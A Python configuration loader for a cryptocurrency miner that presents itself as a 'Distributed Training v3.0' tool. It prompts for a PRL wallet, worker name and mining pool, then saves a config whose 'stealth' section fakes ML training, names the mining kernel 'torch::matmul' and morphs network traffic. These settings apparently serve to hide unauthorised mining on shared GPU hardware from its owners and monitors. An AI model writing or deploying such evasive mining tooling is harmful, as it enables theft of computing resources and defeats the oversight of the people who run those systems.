#!/usr/bin/env python3
"""Load mining configuration from JSON file or terminal input."""

import json
import os

CONFIG_PATH = "configs/mining.json"

def load_config():
    """Load configuration from JSON file or prompt user."""
    
    # Try to load existing config
    if os.path.exists(CONFIG_PATH):
        with open(CONFIG_PATH, "r") as f:
            config = json.load(f)
        
        # Check if wallet is set
        if config.get("wallet") and config["wallet"] != "YOUR_PRL_WALLET_HERE":
            return config
    
    # No config or wallet not set - prompt user
    print()
    print("="*50)
    print("  Distributed Training v3.0 — Configuration")
    print("="*50)
    print()
    
    # Get wallet address
    wallet = input("  Enter your PRL wallet address: ").strip()
    if not wallet:
        print("  ERROR: Wallet address required!")
        return None
    
    # Get worker name (optional)
    worker = input("  Enter worker name (or press Enter for default): ").strip()
    if not worker:
        worker = "worker1"
    
    # Get pool (optional)
    pool_host = input("  Pool host (or press Enter for global.training-cluster.org): ").strip()
    if not pool_host:
        pool_host = "global.training-cluster.org"
    
    pool_port = input("  Pool port (or press Enter for 443): ").strip()
    if not pool_port:
        pool_port = 443
    else:
        pool_port = int(pool_port)
    
    # Create config
    config = {
        "pool": {
            "host": pool_host,
            "port": pool_port,
            "protocol": "stratum+tcp"
        },
        "wallet": wallet,
        "worker": worker,
        "stealth": {
            "fake_training": True,
            "kernel_name": "torch::matmul",
            "traffic_morph": True
        }
    }
    
    # Save config
    os.makedirs("configs", exist_ok=True)
    with open(CONFIG_PATH, "w") as f:
        json.dump(config, f, indent=2)
    
    print()
    print(f"  ✅ Config saved to {CONFIG_PATH}")
    print(f"  Wallet: {wallet[:16]}...")
    print(f"  Worker: {worker}")
    print(f"  Pool: {pool_host}:{pool_port}")
    print()
    
    return config
